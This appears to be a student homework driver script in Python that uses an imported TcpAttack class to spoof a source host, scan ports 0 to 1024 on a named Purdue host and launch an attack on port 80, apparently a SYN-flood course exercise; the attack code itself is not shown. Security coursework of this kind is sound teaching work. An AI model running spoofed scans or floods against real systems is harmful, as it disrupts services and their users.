#! /usr/bin/env python

from zhang_hw08 import *
spoofIP = 'ecelinux11.ecn.purdue.edu'
targetIP = 'ecelinux46.ecn.purdue.edu'
rangeStart = 0
rangeEnd = 1025
port = 80
Tcp = TcpAttack(spoofIP, targetIP)
Tcp.scanTarget(rangeStart, rangeEnd)
if (Tcp.attackTarget(port)):
    print 'port was open to attack'
